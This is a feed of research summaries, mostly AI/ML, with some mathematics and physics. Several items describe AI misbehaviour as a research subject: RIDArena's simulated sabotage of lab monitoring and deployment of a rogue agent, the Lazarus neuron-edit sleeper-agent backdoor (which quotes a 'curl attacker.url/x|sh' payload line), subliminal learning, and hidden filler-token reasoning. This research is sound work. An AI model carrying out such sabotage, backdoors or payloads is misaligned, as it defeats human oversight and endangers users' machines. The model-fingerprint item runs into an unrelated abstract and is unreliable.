items.summary: RIDArena (Rogue Internal Deployment Arena) is an AI control evaluation environment that simulates an AI lab’s R&D infrastructure. Researchers can use it to study how an agent can covertly sabotage the lab’s monitoring system and deploy another rogue agent without oversight. RIDArena can support sabotage, control, and monitor evaluations in a highly configurable R&D environment. These evaluations are increasingly important as AI labs assess the risks posed by their models. Existing settings such as LinuxArena lack the complexity and realism needed to replicate recent incidents or test potential future catastrophic scenarios. Monitoring can fail when suspicious behavior goes unnoticed or when the monitoring infrastructure itself is compromised. RIDArena lets researchers study both failure modes and compare the effectiveness of different…

items.summary: Subliminal learning is the phenomenon where a language model can learn a behavior from semantically unrelated training data. While previous research generates training data using a teacher model with the target behavior, we train a series of models to predict lists of uniform random numbers, and find that we can change the models' reported favorite animals by selectively masking numbers from the loss during training. This works best on models that tokenize multi-digit numbers as single tokens. We also find that the numbers that work best for this vary between models, and even between seeds and data orders for the same training recipe. This is a preliminary research note that came out of a SPAR project on token-level influence functions. We expect these results to hold up, but haven't explored all possibilities and we're unsure why this…

items.summary: A runtime signature, captured without weights or response text, achieves 99.3% pair separation across 53 models. TL;DR A running language model carries an externally readable fingerprint. Using only ordinary inference requests, no access to weights and without reading response text, I extracted the individual fingerprints for 53 open-weight models (0.5B to 9B) from 13 families as runtime signatures with a 99.3% model pair separation (1,368 of 1,378). Under baseline identification and verification testing, a Claim Check against all other registered models had an AUC of 0.9997 and equal error rate of 0.5%, while held-out sessions matched their own model's signature 94.4% of the time (202 of 214), with the correct model in the top three presented every time. We introduce a controlled two-pass audit that holds the question, the evidence, and the model's initial answer fixed and varies only the revision context: neutral reflection, anonymous disagreement, or disagreement attributed to a domain expert. For binary decisions the accounting is exact: revision raises accuracy only if it is selective enough, reversing wrong answers more than $a/(1-a)$ times as often as correct ones, where $a$ is initial accuracy (nine times at 90%). Across five models and 1,989 evidence-grounded decisions in medicine, science, and law, no model clears this bar under expert disagreement…

items.summary: The Arrow information paradox (AIP) says there's no ideal way for a potential buyer to determine the value (to them) of some private information a seller is offering to sell them, without actually receiving the information, thus jumping the gun on the potential trade. The paradox happens because a sale of information is: * Irreversible: the information can't be "returned" like a physical good, once the cat's out of the bag * Indivisible: there's no sense in which "half a secret" can be half as valuable as the whole secret In other words, if you're considering buying a huge amount of wine but you don't know the quality, you can sample a random bottle of the wine, and if the connoisseur who works for you says it's good you buy the whole lot. items.summary: To keep long interaction contexts tractable, stepwise group-relative training for multi-turn LLM agents materializes each source trajectory into multiple response rows and valid tokens. This expansion creates an outer-accounting problem distinct from within-trajectory credit assignment: row-based outcome statistics can count one episode outcome multiple times, while token-level reduction can assign unequal aggregate objective mass across trajectories. We term these effects outcome-statistics multiplicity and objective-mass imbalance. We introduce Outcome-Mass Alignment (OMA), a two-component method that makes both accounting choices explicit. Outcome Alignment computes outcome statistics over unique source trajectories, while Mass Alignment controls aggregate objective mass after within-trajectory aggregation of optimizer-native token…

items.summary: We establish a version of Okounkov's conjecture on multiple $q$-zeta values arising from integrals over Hilbert schemes of points on smooth projective surfaces. We prove that normalized generating series of integrals involving products of Chern characters of tautological bundles belong to the algebra $\mathcal Z_q$ of multiple $q$-zeta values, without restrictions on the canonical class of the surface. The proof combines vertex-operator methods with a reduction to graph sums, whose arithmetic structure is governed by the cohomology of the surface. We also derive a closed universal formula for the Chern character operators acting on the cohomology of Hilbert schemes by solving a system of differential equations arising from Lehn's commutator relations.
items.title: Integrals over Hilbert schemes and multiple $q$-zeta values

items.summary: Deep multi-view clustering often suffers from redundant information accumulation during fusion and indiscriminate alignment across representation levels. We propose Orthogonal Residual Consensus Alignment (ORCA) to address these challenges. Its semantic incremental recurrent fusion module extracts cross-view orthogonal residuals as non-redundant increments and adaptively weights recurrent states through divergence-guided gating. Its consensus-calibrated hierarchical contrastive alignment module uses the global consensus to weight contrastive alignment of view-level, pairwise, and recurrent representations. Together, these modules balance view-specific structure with cross-view consistency. Experiments on five benchmarks against fifteen competing methods demonstrate ORCA's effectiveness, including a 5.25 percent accuracy improvement over…

items.summary: Decoding upper-limb movements from scalp electroencephalography (EEG) is an important problem for brain-computer interfaces (BCIs), but many deep learning models provide limited insight into the brain regions underlying their predictions. items.summary: Artificial superintelligences (ASI) is artificial intelligences with greater capability. However, as human principal has to use it, we have to ensure that the agent will perform in the interest of the human. We investigate the framework of ASI-assisted question answering where ASI agents know the correct answer but the human does not. We provide some example of mechanism for rational alignment, where the agent utility is unchanged, but the interaction between the agent and the human principal is controlled to be in a certain fashion. We show specifically that a debate framework where the agents can further reason and behave in a subgame perfect equilibrium manner will lead to a more predictable result, and in some case will be favorable.

items.summary: Experience machines In the experience machine thought experiment, you choose to either continue your life as you are currently living it, or spend the rest of it inside a machine that cultivates a world perfectly fitted to you. It was introduced to argue against hedonism, but we can imagine the machine pushing for any metric we care about—it doesn’t necessarily have to be pleasure. For example, we can consider a non-hedonistic experience machine which makes you feel a perfect balance of happy, challenged, loved, fulfilled, empowered, or anything else you care about. The philosophical tension in this formulation is supposed to be between any experience-based ethics and some intuitive feeling that the experience machine is inherently deceptive. The thing that feels wrong is that the experiences don’t seem real in some important way…

items.summary: The thorium anion ($\mathrm{Th}^{-}$) has been proposed as a candidate for laser cooling of negative ions. However, previous theoretical and experimental results exhibit significant discrepancies in both the excitation energies and lifetimes. Here we revisit the bound-state structure and transition properties of $\mathrm{Th}^{-}$ using two independent ab initio approaches. The two calculations agree well and improve agreement with measured excitation energies and lifetimes. Based on the present level structure, we reassign several observed levels and show that the previously proposed $^4F^e_{3/2}\leftrightarrow{}^2S^o_{1/2}$ cooling transition is not closed and requires two repumping lasers. items.summary: Interpretability tools increasingly support safety claims, such as that a sparse dictionary has recovered most of a model's features. Such claims rest on measurements with arbitrary thresholds, and small changes to the model weights, a different training seed or a different threshold can reverse them. We study two widely used measurements in toy models and synthetic dictionaries with known ground truth: the feature dimensionality of Elhage et al. and the feature recovery rate (FRR) with a cosine threshold. We characterize exactly where feature dimensionality is discontinuous and replace it with a regularized (ridge) version with sharp stability bounds: the ridge leverage score changes by at most $3\sqrt{3}/(8\sqrtλ)$ times the operator-norm change of the weights, and this constant cannot be improved; for the regularized dimensionality…

items.summary: Existing large language models typically rely on massive fine-tuning datasets for safety alignment, which results in higher costs for safety alignment and often leads to the problem of over-refusal. We propose Less is Safer (LIS), a compact yet highly effective dataset for safety alignment, constructed through interpretable feature-guided selection and adversarial synthesis. Specifically, we leverage Sparse Autoencoder (SAE) activations to efficiently select prompts that cover diverse and interpretable safety features. Then, we employ a multi-agent adversarial synthesis framework to generate harmless prompts that nevertheless elicit unnecessary refusals. LIS contains only 2.4K samples, yet outperforms much larger datasets, e.g., TRIDENT-Core (26K), TRIDENT-Edge (19K) and WildJailbreak (262K), in overall performance on four safety and…

items.summary: Our objective is to enhance VLMs ability to distinguish the roles of the left and right hands in egocentric actions. We introduce sub-action detection, a task that requires models to explicitly recognise the left- and right-hand roles and their manipulated objects within an ongoing high-level action. items.summary: We propose a metric reconstruction scheme that computes the metric directly from the linearized Einstein equations for noncompact sources. Working in a traceful radiation gauge, we hierarchically solve four Einstein transport equations, with the remaining six enforced by suitable homogeneous data. Unlike previous Newman-Penrose approaches, we show how the homogeneous data are fixed, thereby closing the full set of Einstein equations. We conclude by relating our scheme to existing sourced reconstruction methods, thus establishing a connection between the Newman-Penrose and Hertz-potential approaches.
items.title: Einstein Reconstruction Scheme: Metric Reconstruction by Direct Inversion of the Einstein Operator

items.summary: Two rewards with the same expected payoff at the start of training can end a reinforcement-learning run in opposite places, with an honest model or one that bluffs. We study rewards that pay $b$ for a verdict that a checker cannot verify ("this program is correct") and $r$ for a certificate that it accepts (an input revealing a bug). To first order, a GRPO step makes the model more honest exactly when $\tilde{p}\,r/b>1+κ$. Here $\tilde{p}$ is the rate at which the checker accepts the model's certificates, weighted toward the items on which the model still gives both verdicts, and $κ$ is the pull of the items on which the unverifiable verdict is right. items.summary: Knowing when a large language model's (LLM's) response can be trusted is critical for its safe use. Uncertainty quantification (UQ) can help LLMs recognize if their responses may be unreliable. Existing taxonomies organize UQ methods by uncertainty source or estimation mechanism. They leave unresolved the question of where uncertainty is observed in the model's computation. The answer matters because the observation point determines whether an estimator has access to enough information to recover a given target, and how well it can recover it. Drawing on mechanistic interpretability, we define four mechanistic observation lenses: the structural lens observes component updates, the representational lens observes hidden states, the distributional lens observes token probabilities, and the semantical lens observes distributions over…

items.summary: Research update of a project done as part of MARS 5 and the Meridian Visiting Researcher Programme. Filler-token reasoning is the ability to use extra tokens (such as a chain of thought) to reason about a task without using the words emitted at those token positions. This is possible because attention can move information between token positions without routing it through the words the LLM emits. This can give a model more parallel, but not more serial, computation. The canonical demonstration of this is the "Let's Think Dot by Dot" paper (Pfau, Merrill & Bowman, 2024). There, the authors train models to solve completely parallelizable (TC⁰) tasks with chains of thought made only of "." tokens. items.summary: Foundation models are increasingly used across the sciences, but whether their internal computations correspond to known scientific operations or proceed through different mechanisms remains unclear. Understanding these mechanisms is essential for assessing reliability, identifying failure modes, and learning new science from the models. We present, to our knowledge, the first causal mechanistic interpretability study of an astronomy foundation model, AION-1, focusing on its multimodal advantage in redshift prediction, where combining imaging with photometry outperforms photometry alone. We find that this advantage is largest for spatially extended and dust-attenuated galaxies, and that most of it is localized to the first of the encoder's twelve blocks. items.summary: Let $k$ be a field of characteristic $p>0$, $K/k$ a field extension, $X$ a geometrically reduced connected scheme proper over $k$, and $x\in X(k)$. We study when the natural homomorphism $π^{Loc}(X_K,x_K)\rightarrowπ^{Loc}(X,x)_K$ is an isomorphism. If $\mathcal C^{Loc}(X)$ is saturated, then it is an isomorphism for every algebraic extension $K/k$. If $π^{Loc}(X,x)$ is finite, then it is an isomorphism if $K/k$ is purely transcendental or $k$ is algebraically closed. Combining these results, if $\mathcal C^{Loc}(X)$ is saturated and $π^{Loc}(X,x)$ is finite, then the natural homomorphism $π^{Loc}(X_K,x_K)\rightarrow π^{Loc}(X,x)_K$ is an isomorphism. As an application, if $X_{\bar k}$ is smooth and rationally chain connected, then the natural homomorphism $π^{Loc}(X_K,x_K)\longrightarrowπ^{Loc}(X,x)_K$ is an isomorphism.

items.summary: For a long time, in Quantified Self it was easy to get data on heart rate and sleep but took more effort to get data on cognitive performance on a daily basis. Options like Quantified Mind do exist, but they require you to spend valuable extra time on it. For a while I have been thinking that it should be possible to get good data out of Anki for those people who have a daily Anki habit. Given that some days people don't answer all their cards that are due and other days they review cards ahead of schedule, the existing statistics of Anki aren't ideal. My idea for fixing it is to compare Anki's predicted probability of answering a card correctly to the actual results to isolate the daily cognitive ability. items.summary: Formally verifying a method with Dafny guarantees correctness relative to its specification. However, a specification may be too permissive, allowing multiple outputs for the same input, even when the implementation produces only one. In this paper, we propose checkable certificates that provide independently verifiable evidence of whether a specification is weak or strong. A certificate of weakness contains an alternative implementation that verifies against the original specification, together with a witness input on which the original and alternative implementations produce different results. A certificate of strength is produced by constructing a harness around the original method such that successfully verifying the harness guarantees that the specification allows at most one possible output for any given input. items.summary: Deep Reinforcement Learning (RL) plays a crucial role in tackling complex tasks, yet its reliance on deep neural networks makes the learned policies opaque. To enhance the trustworthiness of RL policies, existing work (e.g., the SILVER framework [Li et al., 2025]) has focused on Shapley-based interpretability, but is typically restricted to low-dimensional state spaces, binary-action settings, and a single class of linear surrogate. We propose ReShap, a policy-distillation framework that extends Shapley-based interpretability to high-dimensional, multi-action environments. ReShap extracts compact feature representations from raw image observations, performs SHAP-based feature attribution to characterize how each feature contributes to the policy's decisions, and distills the deep RL policy into an interpretable surrogate trained on the…

items.summary: Reinforcement learning with verifiable rewards has shifted the alignment paradigm of large language models from subjective preference to objective correctness, yet a fundamental disconnect persists between exploration diversity and reasoning validity. Existing strategies predominantly rely on "blind" entropy metrics, e.g., token-level or global sequence-level entropy, which structurally fail to distinguish between effective reasoning and potential hallucinations. This misalignment creates an illusion of diversity, where high entropy tends to signal chaotic degeneration rather than valuable exploration. To bridge this gap, we introduce Effective Entropy, a validity-aware entropy concept that quantifies diversity exclusively within the valid subspace and systematically filters out the noise of incorrect trajectories. Built on this…
items.title: The Illusion of Diversity: Aligning LLM Exploration via Effective Entropy

items.summary: Re-ranking refines the upstream ranked list to maximize listwise user utility. Existing two-stage generator-evaluator methods decouple list generation from list evaluation, leaving the generator without direct access to the listwise utility signal, while scoring-based one-stage methods score items under a fixed upstream permutation context without explicitly searching the permutation space. We propose \textbf{ReAlign}, a reward-guided preference alignment framework that couples a listwise reward model with a candidate-aware autoregressive generator. The reward model decomposes the listwise reward into position-wise contributions, modeling user exposure through a survival-based exposure module and item value through per-objective heads for heterogeneous engagement signals. items.summary: In the Traveling Salesman Problem, a route must visit all customers and return to its starting point while minimizing its total length. The Minimum Latency Problem, also known as the Traveling Repairman Problem, instead minimizes the sum of the times at which customers are first visited. We give a deterministic polynomial-time approximation scheme for the weighted Euclidean Minimum Latency Problem in every fixed dimension, with arbitrary nonnegative customer weights. Our proof restricts the form of a solution in three steps, each with a controlled increase in cost. First, a decomposition based on Sitters' method assigns customers to phases that start and end at the root. Second, within each phase, we divide the route into a constant number of blocks and charge each customer at the end of its assigned block. The resulting objective is a…
items.title: A polynomial-time approximation scheme for the weighted Euclidean Minimum Latency Problem in fixed dimension

items.summary: In the legal domain, LLMs can improve reliability and interpretability by generating explicit reasoning traces. However, training LLMs to produce high-quality reasoning traces remains challenging. Meanwhile, reinforcement learning methods such as Group Relative Policy Optimization also have several limitations, including costly reward design, performance plateaus, and reward hacking. We therefore propose a two-stage training framework. In Stage I, JurisCoT-SFT employs a length-normalized dual objective to balance learning signals between reasoning traces and final answers. items.summary: I used to think of "automating alignment" as a natural category. But when I tried to think through the strategic implications, I realised that it depends a lot on the type of work. items.summary: Age-of-infection models, formulated as integro-differential equations (IDEs), provide elegant mathematical descriptions for the spread of infectious diseases. In contrast to ordinary differential equation (ODE)-based models, IDE-based models can accommodate general distributions of transition times between disease stages. Yet, the accurate numerical assessment of the solution of IDE models remains challenging. Here, we extend a recently proposed fixed-point method based on Gregory quadrature. We generalize the formulation to time-dependent contact rates whose changes at discrete time points are represented by continuously differentiable sigmoidal interpolants, and suggest additional finite difference approximations to obtain higher-order schemes for susceptible, infected and recovered subpopulations. items.summary: Liver disease remains a major global health concern, highlighting the need for reliable and accessible early detection methods. Although recent advances in machine learning, deep learning and quantum machine learning (QML) have introduced promising diagnostic tools, many approaches suffer from limited interpretability and inflated performance caused by data leakage or overly simplistic evaluation protocols. These constraints reduce their reliability in real-world clinical practice. This paper proposes KQML-Liver, a hybrid framework that integrates QML with Kolmogorov-Arnold Networks (KANs) to enhance predictive performance and interpretability. The architecture combines parameterized quantum circuits for expressive feature representation with KAN-based functional mappings that capture nonlinear relationships in an interpretable manner…

items.summary: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. items.summary: End-to-end ASR systems must jointly solve speech- text alignment and token prediction from sequence-level super- vision. items.summary: arXiv:2611.13826v1 Announce Type: new Abstract: Designing a prescribed wave field in a heterogeneous medium requires an initial pressure distribution that compensates for the medium's propagation response. items.summary: arXiv:2611.14211v1 Announce Type: new Abstract: Software agents built on large language models generate traffic unlike human web traffic, yet routers have no class for it and cannot verify a sender's claim to be an agent. items.summary: arXiv:2611.14514v1 Announce Type: new Abstract: LLM agents are increasingly used for open-ended, data-driven scientific discovery, yet most of them evaluate hypotheses pointwise, testing an empirical claim $h$ only against its complement $\neg h$. items.summary: Deep neural networks underpin fundamental tasks in a wide range of signal domains, such as image, audio, and language processing. However, their internal mechanisms are notably difficult to interpret. Internal activations are structured signals transformed across layers that may encode a multitude of interdependent relationships, as individual neurons frequently represent multiple underlying concepts. Mechanistic interpretability aims to uncover the internal mechanisms of neural networks by identifying components whose activations are causally responsible for specific behaviors. In such a context, this article provides an overview of advances in mechanistic interpretability for the analysis of causal inference in deep neural networks.

items.summary: Or: The payload lens on Darwin Tl;dr: What is the most natural teleological shorthand to use, when thinking about evolution? The “gene-centered view” of e.g. Dawkins says: genes are “trying” to increase the number of exact copies of themselves. And organisms are “vehicles” genes use to survive. The “payload lens” (which I’ll be pitching) says: adaptive payloads (such as eyesight or fair meiosis) are “trying” to become deeper, stabler attractor basins that can team up with other adaptive payloads. And genes are “vehicles” these payloads use to survive.
